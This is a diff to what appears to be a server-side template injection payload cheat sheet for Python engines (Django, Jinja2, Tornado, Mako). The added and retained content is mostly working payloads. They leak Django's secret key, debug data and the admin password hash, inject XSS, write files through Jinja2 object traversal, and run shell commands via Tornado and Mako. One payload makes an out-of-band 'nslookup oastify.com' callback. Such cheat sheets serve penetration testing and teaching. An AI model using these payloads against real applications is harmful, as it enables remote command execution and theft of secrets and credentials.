@@ -2,7 +2,14 @@
 
 ## Summary
 
+- [Templating Libraries](#templating-libraries)
 - [Django](#django)
+    - [Django - Basic injection](#django---basic-injection)
+    - [Django - Cross-site scripting](#django---cross-site-scripting)
+    - [Django - Debug information leak](#django---debug-information-leak)
+    - [Django - Leaking app's Secret Key](#django---leaking-apps-secret-key)
+    - [Django - Admin Site URL leak](#django---admin-site-url-leak)
+    - [Django - Admin username and password hash leak](#django---admin-username-and-password-hash-leak)
 - [Jinja2](#jinja2)
     - [Jinja2 - Basic injection](#jinja2---basic-injection)
     - [Jinja2 - Template format](#jinja2---template-format)
@@ -11,21 +18,39 @@
     - [Jinja2 - Dump all config variables](#jinja2---dump-all-config-variables)
     - [Jinja2 - Read remote file](#jinja2---read-remote-file)
     - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
-    - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
+    - [Jinja2 - Remote Command Execution](#jinja2---remote-command-execution)
         - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
         - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
         - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
         - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
         - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
     - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
+- [Tornado](#tornado)
+    - [Tornado - Basic injection](#tornado---basic-injection)
+    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)    
 - [Mako](#mako)
-    - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
+    - [Mako - Remote Command Execution](#mako---remote-command-execution)
+- [References](#references)
+
+## Templating Libraries
+
+| Template Name | Payload Format |
+| ------------ | --------- |
+| Bottle    | `{{ }}`  |
+| Chameleon | `${ }`   |
+| Cheetah   | `${ }`   |
+| Django    | `{{ }}`  |
+| Jinja2    | `{{ }}`  |
+| Mako      | `${ }`   |
+| Pystache  | `{{ }}`  |
+| Tornado   | `{{ }}`  |
+
 
 ## Django
 
 Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
 
-### Django - Detection
+### Django - Basic injection
 
 ```python
 {% csrf_token %} # Causes error with Jinja2
@@ -33,47 +58,34 @@ Django template language supports 2 rendering engines by default: Django Templat
 ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 ```
 
-### Django Templates for post-exploitation
 
-```python
-# Variables
-{{ variable }}
-{{ variable.attr }}
-
-# Filters
-{{ value|length }}
-
-# Tags
-{% csrf_token %}
-```
-
-### Cross-site scripting
+### Django - Cross-site scripting
 
 ```python
 {{ '<script>alert(3)</script>' }}
 {{ '<script>alert(3)</script>' | safe }}
 ```
 
-### Debug information leak
+### Django - Debug information leak
 
 ```python
 {% debug %}
 ```
 
-### Leaking app’s Secret Key
+### Django - Leaking app’s Secret Key
 
 ```python
 {{ messages.storages.0.signer.key }}
 ```
 
-### Admin Site URL leak
+### Django - Admin Site URL leak
 
 
 ```
 {% include 'admin/base.html' %}
 ```
 
-### Admin username and password hash leak
+### Django - Admin username and password hash leak
 
 
 ```
@@ -162,7 +174,7 @@ Access `__globals__` and `__builtins__`:
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
 ```
 
-### Jinja2 - Remote Code Execution
+### Jinja2 - Remote Command Execution
 
 Listen for connection
 
@@ -295,10 +307,32 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 ---
 
 
+## Tornado
+
+### Tornado - Basic injection
+
+```py
+{{7*7}}
+{{7*'7'}}
+```
+
+### Tornado - Remote Command Execution
+
+```py
+{{os.system('whoami')}}
+{%import os%}{{os.system('nslookup oastify.com')}}
+```
+
+---
+
+
 ## Mako
 
 [Official website](https://www.makotemplates.org/)
 > Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
+
+
+
 
 ```python
 <%
@@ -308,7 +342,7 @@ x=os.popen('id').read()
 ${x}
 ```
 
-### Direct access to os from TemplateNamespace:
+### Mako - Remote Command Execution
 
 Any of these payloads allows direct access to the `os` module
 
@@ -376,6 +410,7 @@ PoC :
 <module 'os' from '/usr/local/lib/python3.10/os.py'>
 ```
 
-Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
 
----
+## References
+
+* [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
